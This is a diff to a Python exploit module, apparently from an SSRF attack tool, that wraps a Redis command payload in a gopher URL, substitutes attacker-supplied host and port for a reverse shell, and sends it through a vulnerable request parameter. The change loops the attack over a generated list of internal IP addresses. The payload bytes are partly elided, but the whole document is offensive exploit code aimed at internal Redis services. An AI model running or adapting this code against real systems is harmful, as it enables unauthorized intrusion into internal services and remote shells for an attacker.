@@ -11,18 +11,21 @@ class exploit():
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
 
-        # Data for the service
-        ip   = "127.0.0.1"
-        port = "6379"
-        data = "*1%0d%0a$8%0d%0af[...]save%0d%0aquit%0d%0a"
-        payload = wrapper_gopher(data, ip , port)
+        # Using a generator to create the host list
+        gen_host = gen_ip_list("127.0.0.1", args.level)
+        for ip in gen_host:
 
-        # Handle args for reverse shell
-        if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
-        else:                  payload = payload.replace("SERVER_HOST", args.lhost)
+            # Data for the service
+            port = "6379"
+            data = "*1%0d%0a$8%0d%0af[...]save%0d%0aquit%0d%0a"
+            payload = wrapper_gopher(data, ip , port)
 
-        if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
-        else:                  payload = payload.replace("SERVER_PORT", args.lport)
+            # Handle args for reverse shell
+            if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
+            else:                  payload = payload.replace("SERVER_HOST", args.lhost)
 
-        # Send the payload
-        r = requester.do_request(args.param, payload)
+            if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
+            else:                  payload = payload.replace("SERVER_PORT", args.lport)
+
+            # Send the payload
+            r = requester.do_request(args.param, payload)
